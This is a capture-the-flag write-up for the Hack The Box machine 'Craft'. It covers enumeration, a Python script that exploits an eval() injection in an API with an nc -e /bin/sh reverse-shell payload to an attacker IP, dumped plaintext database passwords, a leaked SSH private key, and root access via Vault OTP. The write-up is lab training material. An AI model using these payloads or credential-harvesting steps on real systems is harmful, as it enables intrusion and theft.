# Craft

Author: rotarydrone

Overall one of the best boxes I've come across in terms of "realness", and how small mistakes can end up snowballing to real big ones.
Kudos to the author for this awesome box!

### Nmap Enumeration

```
 ⚡ root@kali  ~/craft  nmap -sV -sC 10.10.10.110
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-02 00:11 +08
Nmap scan report for api.craft.htb (10.10.10.110)
Host is up (0.33s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Looking at the nmap output, we see 2 ports open, namely 22 and 443 which hosts an ssh and https service respectively. we can go ahead and add craft.htb to our hosts file as it seems it's using its own domain name system.

### Web Enumeration

Using gobuster, we can see if this web server is hosting any interesting files or directories.

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.110
[+] Threads:        10
[+] Wordlist:       /root/SecLists-master/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/02 00:53:40 Starting gobuster
===============================================================
===============================================================
2019/09/02 00:57:21 Finished
===============================================================
```
No luck with that, moving on to the api page, we see a number of APIs that the web service hosts:

![main](main.JPG)

There is an authentication API here, which means that the APIs will be limited based on the user's authentication, and as we can see, POST, PUT and DELETE all require authentication, whereas both GET methods do not. 

This means that our attack vector will most likely be an authenticated one. 

Crawling through the Gogs page, it seems like its a repository for the source code. If the developers are careless, it could leak valuable information through history logs.

![gogs](gogs.JPG)

Looking at the .gitignore, we can see that the settings.py file was blocked out and from the code, it seems that it contains credentials to the database used.

Let's look at the issue that was not resolved; it seems there are 3 key players in this project, dinesh, ebachman and gilfoyle. Dinesh seems to be a tester among the three of them.

Enumerating his user profile and commit history, seems like he has not been a very careful tester..

![careless](careless.JPG)

With the credentials, we can probably get ourselves an authentication token. Now we just have to find the vector to get on the system.

### Exploit
The API for PUT seems to be a little unsafe,
```
    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```
The use of eval to validate is a very bad idea as eval has serious security issues namely, that we can use an ```__import__``` to import libraries and execute them within the eval statement itself.

Using this exploit, we can craft a simple python script to automate the POST process with our token

```
import requests
from requests.auth import AuthBase
import urllib3

# user: dinesh
# pass: 4aUh0A8PbVJxgd

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class CraftAuth(AuthBase):
    def __init__(self, token):
        self.token = token

    def __call__(self, r):
        r.headers['X-Craft-API-Token'] = f'{self.token}'
        return r

def post(token):
    data = "__import__('subprocess').call(['nc','-nv','10.10.14.26','1234','-e','/bin/sh'])"
    response = requests.post('https://api.craft.htb/api/brew/', json = {'id':3000, 'brewer': 'hello', 'name': 'hello', 'style': 'hello', 'abv': data}, auth = CraftAuth(token), verify=False)
    print(response.text)

token = input('Input token here =>')
post(token)
```

This will take our token and perform our post request with the malicious import statement as shown above. With that, we can get ourselves a shell!

```
 ✘ ⚡ root@kali  ~/writeup  nc -lvnp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.110.
Ncat: Connection from 10.10.10.110:44753.
whoami
root
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:06  
          inet addr:172.20.0.6  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:376 errors:0 dropped:0 overruns:0 frame:0
          TX packets:291 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:41008 (40.0 KiB)  TX bytes:194838 (190.2 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:4 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:210 (210.0 B)  TX bytes:210 (210.0 B)
```
Looks like we've got ourselves into the development server for the web app. Seems like we have limited functionalities like stderr output on this server too which would mean we are in some sort of a chroot jail. Time to look around and get out!

### Database enumeration

Using ```netstat -alnp```, we can see the connections on this machine

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:44115        0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      1/python
tcp        0      0 172.20.0.6:58526        172.20.0.4:3306         ESTABLISHED 1/python
tcp        0     54 172.20.0.6:44753        10.10.14.26:1234        ESTABLISHED 59/sh
tcp        1      0 172.20.0.6:8888         172.20.0.7:52584        CLOSE_WAIT  1/python
udp        0      0 127.0.0.11:49471        0.0.0.0:*                           -
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
```

We can see that the database used for this app is running on a different machine, and we do not have the ```mysql``` binary here. One method I used to get around this was to query the database using the code from dbtest.py. 

__*Note*__ : Since we are not in a proper shell, editing files with vi is quite a pain. I used ```netcat``` to pass files from my remote machine to the machine we're on.
```
import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `*` FROM INFORMATION_SCHEMA.TABLES" 
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
connection.close()
```

Some of the tables we can enumerate:
```
{'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'brew', 'TABLE_TYPE': 'BASE TABLE', 'ENGINE': 'InnoDB', 'VERSION':
10, 'ROW_FORMAT': 'Dynamic', 'TABLE_ROWS': 2338, 'AVG_ROW_LENGTH': 105, 'DATA_LENGTH': 245760, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH':
0, 'DATA_FREE': 0, 'AUTO_INCREMENT': 2350, 'CREATE_TIME': datetime.datetime(2019, 2, 7, 1, 23, 11), 'UPDATE_TIME': None,
'CHECK_TIME': None, 'TABLE_COLLATION': 'utf8mb4_0900_ai_ci', 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
{'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'user', 'TABLE_TYPE': 'BASE TABLE', 'ENGINE': 'InnoDB', 'VERSION':
10, 'ROW_FORMAT': 'Dynamic', 'TABLE_ROWS': 3, 'AVG_ROW_LENGTH': 5461, 'DATA_LENGTH': 16384, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0,
'DATA_FREE': 0, 'AUTO_INCREMENT': 6, 'CREATE_TIME': datetime.datetime(2019, 2, 7, 1, 23, 15), 'UPDATE_TIME': None, 'CHECK_TIME':
None, 'TABLE_COLLATION': 'utf8mb4_0900_ai_ci', 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''}, {'TABLE_CATALOG':
'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'CHARACTER_SETS', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION':
10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0,
'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME':
None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
```
We can see 2 table names here, ```user``` and ```brew```, and the tables after which are the standard base tables in a mysql database.

Changing up our script a little, we can enumerate the user table and hopefully get some useful information

```
import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `*` FROM `user`" 
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
```

This time, we will be querying all the rows and columns in the user table, and we get the following output:
```
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

Seems like we got the credentials of the other users for the gogs page!

### Back to Web

Trying to login with gilfoyle, we see that he has a private repository with a .ssh folder!

![gilfoyle](gilfoyle.JPG)

Looks like we can get his private key from this!

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
-----END OPENSSH PRIVATE KEY-----
```
We can probably make use of this to get a low privilege shell.

Grabbing the private key and changing modifications to 600, we can get a ssh shell on the 10.10.10.110 server.
```
 ⚡ root@kali  ~/craft  ssh -i id_rsa gilfoyle@10.10.10.110


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gilfoyle@craft:~$ ls
user.txt
gilfoyle@craft:~$ wc -c user.txt 
33 user.txt
gilfoyle@craft:~$ 
```

Looking at ```ip addr -a```, we can see that craft hosts other servers which are probably running the web app. This explains the chroot that we encountered on the previous server.

## Privilege Escalation

We can go ahead and quickly add our ssh keys on this box so that we can transfer binaries easily from our box.

From the user's directory, we can see a .vault-token file which means there could be a service called ```vault``` running on this machine.

LinEnum doesn't seem to provide us with much information this time but pspy shows us some promising results on the services running:
```
2019/09/01 14:00:19 CMD: UID=0    PID=2433   | vault server -config /vault/config/config.hcl 
2019/09/01 14:00:19 CMD: UID=0    PID=2417   | containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/47a81a3348a99bbc3bc112b6fc12fb85211e59c152d385c52fb3d9310e112906 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc 
```

We can see that the vault service is being run and a new server is spawned when we log in to the box.

Reading up the documentation on this service, we can see that it allows secrets to be stored and shared across many servers using the shamir's secret sharing algorithm.

Listing the secrets engines that are enabled, 
```
Path          Type         Accessor              Description
----          ----         --------              -----------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
identity/     identity     identity_56533c34     identity store
secret/       kv           kv_2d9b0109           key/value secret storage
ssh/          ssh          ssh_3bbd5276          n/a
sys/          system       system_477ec595       system endpoints used for control, policy and debugging
```

We can see that there's an ssh engine in place and this could cause some major security concerns..

Which gilfoyle has already affirmed in his repository:

![ssh](ssh.JPG)

We can probably use that to give us an ssh shell direct, which the documentation clearly shows for ssh sessions with the use of OTPs instead of passwords.

```
gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.10.10.110
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: fe7721c3-8b08-1605-bd23-d37d111bd93a
The authenticity of host '10.10.10.110 (10.10.10.110)' can't be established.
ECDSA key fingerprint is SHA256:sFjoHo6ersU0f0BTzabUkFYHOr6hBzWsSK0MK5dwYAw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.110' (ECDSA) to the list of known hosts.


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 04:53:14 2019
root@craft:~# ls
root.txt
root@craft:~# whoami
root
root@craft:~# wc -c root.txt 
33 root.txt
root@craft:~# 
```

Slightly underwhelming for a privilege execution, but nonetheless a great box and teaches us the true importance of securing not only your code as a developer, but your history and what you store on the cloud. Hope you enjoyed the box as much as I did!

